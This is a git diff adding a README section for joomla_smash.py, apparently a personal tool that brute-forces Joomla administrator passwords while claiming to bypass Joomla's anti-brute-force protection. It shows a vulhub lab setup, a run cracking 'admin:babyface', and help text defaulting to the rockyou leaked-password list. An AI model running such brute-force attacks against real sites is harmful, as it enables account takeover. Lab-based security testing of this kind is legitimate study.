@@ -307,3 +307,54 @@ Capturing on 'Wi-Fi: en0'
   124   0.224251 192.168.86.102 → 176.28.50.165 HTTP 210 HEAD /announce HTTP/1.1
   125   0.225749 192.168.86.102 → 176.28.50.165 HTTP 214 HEAD /announcement HTTP/1.1
 ```
+
+## joomla_smash.py
+
+set up a local joomla env with the excellent https://github.com/vulhub/vulhub
+
+```
+kali@jabroni:[~/src/vulhub/joomla/CVE-2015-8562]:(master *)
+[Exit: 0] 10:20: docker-compose up -d
+Starting cve-2015-8562_mysql_1 ... done
+Starting cve-2015-8562_web_1   ... done
+```
+
+once that is running, finish off the install by setting the admin password. I chose `babyface` because it's 
+in a good place in my default wordlist for testing.
+
+stage your favorite wordlists and smash up the joomla anti-brute force like it isn't even there!
+
+```
+kali@jabroni:[~/src/ctlfish/net]:(master *%)
+[Exit: 0] 13:02: time ./joomla_smash.py -q
+finished setup for username: admin
+Bruteforce succeeded!
+username: admin
+password: babyface
+Waiting for other threads to exit...
+
+real    1m19.106s
+user    0m40.530s
+sys     0m1.189s
+kali@jabroni:[~/src/ctlfish/net]:(master *%)
+[Exit: 0] 13:06: ./joomla_smash.py --help
+usage: joomla_smash.py [-h] [-u URL] [-w WORDLIST] [-t THREADS] [-U USER] [-q]
+
+This script will brute force passwords against Joomla.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     your joomla target (default:
+                        http://0.0.0.0:8080/administrator/index.php)
+  -w WORDLIST, --wordlist WORDLIST
+                        wordlist to use (default:
+                        /Users/csuttles/src/SecLists/Passwords/Leaked-
+                        Databases/rockyou.txt)
+  -t THREADS, --threads THREADS
+                        number of worker threads to spawn, default is number
+                        of cores in system (default: 16)
+  -U USER, --user USER  user to bruteforce (default: admin)
+  -q, --quiet           run in quiet mode (default: False)
+```
+
+this is on a mac, but you can do the same on kali/ubuntu with docker, or do a *real* joomla install if you got a lot of time on your hands. ;)
